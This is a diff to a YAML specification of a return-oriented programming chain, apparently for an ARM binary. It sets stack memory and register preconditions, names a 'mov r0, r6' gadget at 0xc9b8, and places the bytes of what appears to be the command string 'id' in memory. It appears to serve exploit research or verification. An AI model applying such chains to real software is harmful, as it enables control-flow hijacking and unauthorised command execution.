@@ -38,11 +38,7 @@ ropchains:
   default:
     - preconditions:
         mems:
-          '0xbeffc874': '0x90'  # r6: [sp+2*4] == 0xbeffc104+396
-          '0xbeffc875': '0xc2'
-          '0xbeffc876': '0xff'
-          '0xbeffc877': '0xbe'
-          '0xbeffc88c': '0xb8'  # pc: [sp+8*4] == 0xc9b8
+          '0xbeffc88c': '0xb8'  # pc = [sp+8*4] = 0x0000c9b8
           '0xbeffc88d': '0xc9'
           '0xbeffc88e': '0x00'
           '0xbeffc88f': '0x00'
@@ -52,6 +48,8 @@ ropchains:
       instruction:
         ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', 'Gadget 1.0']
     - preconditions:
+        regs:
+          'r0': '0xbeffc290'    # r0 = 0xbeffc104+396 = 0xbeffc290
         mems:
           '0xbeffc290': '0x69'  # 'i'
           '0xbeffc291': '0x64'  # 'd'
